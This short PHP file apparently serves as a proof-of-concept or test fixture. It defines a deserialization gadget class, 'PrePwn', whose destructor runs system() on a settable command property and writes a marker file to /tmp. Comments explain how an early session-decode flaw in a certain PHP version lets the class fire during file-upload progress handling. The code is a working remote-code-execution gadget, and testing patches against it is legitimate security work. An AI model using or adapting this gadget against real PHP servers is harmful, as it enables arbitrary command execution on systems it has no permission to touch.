<?php
// Preloaded gadget class: lives in the class table BEFORE RINIT, which is
// exactly the window the rfc1867 upload-progress early session decode runs
// in (CVE-2026-109618). On 8.2.34 the early decode instantiates this with
// full semantics; on 8.2.35+ (incomplete_classes_only) it degrades to
// __PHP_Incomplete_Class and __destruct never fires.
class PrePwn {
    public $cmd = 'id';
    public function __destruct() {
        file_put_contents('/tmp/pwned_marker', 'PRELOAD_DESTRUCT php=' . PHP_VERSION . ' pid=' . getmypid() . "\n", FILE_APPEND);
        system($this->cmd);
    }
}
